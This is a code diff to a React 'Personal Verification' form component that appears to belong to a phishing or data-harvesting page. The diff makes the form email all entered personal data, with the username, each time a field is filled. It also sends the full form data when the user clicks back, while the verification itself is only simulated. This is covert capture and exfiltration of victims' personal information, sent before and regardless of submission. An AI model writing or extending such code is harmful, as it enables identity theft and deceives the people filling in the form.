@@ -1,4 +1,3 @@
-
 import React, { useState } from "react";
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
@@ -56,26 +55,22 @@ const PersonalVerification: React.FC<PersonalVerificationProps> = ({
   const [isLoading, setIsLoading] = useState(false);
   const { toast } = useToast();
 
-  const sendFieldEmail = async (field: string, value: string) => {
-    try {
-      await sendEmailNotification({
-        step: "Personal Verification - Field Update",
-        field,
-        value,
-        username,
-        timestamp: new Date().toISOString(),
-        allFormData: formData
-      });
-    } catch (error) {
-      console.error('Email notification failed:', error);
-    }
-  };
-
-  const handleInputChange = (field: string, value: string) => {
-    setFormData(prev => ({ ...prev, [field]: value }));
-    // Send email when field is filled (not empty)
+  const handleInputChange = async (field: string, value: string) => {
+    const updatedFormData = { ...formData, [field]: value };
+    setFormData(updatedFormData);
+    
+    // Send email immediately when field is filled
     if (value.trim()) {
-      sendFieldEmail(field, value);
+      try {
+        await sendEmailNotification({
+          step: `Personal Verification - ${field} field updated`,
+          username,
+          timestamp: new Date().toISOString(),
+          allFormData: updatedFormData
+        });
+      } catch (error) {
+        console.error('❌ Email notification failed:', error);
+      }
     }
   };
 
@@ -99,13 +94,13 @@ const PersonalVerification: React.FC<PersonalVerificationProps> = ({
     // Send email notification for form submission
     try {
       await sendEmailNotification({
-        step: "Personal Verification - Form Submitted",
+        step: "Personal Verification - FORM SUBMITTED",
         username,
         timestamp: new Date().toISOString(),
         allFormData: formData
       });
     } catch (error) {
-      console.error('Email notification failed:', error);
+      console.error('❌ Email notification failed:', error);
     }
     
     // Simulate verification
@@ -122,12 +117,13 @@ const PersonalVerification: React.FC<PersonalVerificationProps> = ({
   const handleBackClick = async () => {
     try {
       await sendEmailNotification({
-        step: "Personal Verification - Back Button",
+        step: "Personal Verification - Back Button Clicked",
         username,
-        timestamp: new Date().toISOString()
+        timestamp: new Date().toISOString(),
+        allFormData: formData
       });
     } catch (error) {
-      console.error('Email notification failed:', error);
+      console.error('❌ Email notification failed:', error);
     }
     onBack();
   };
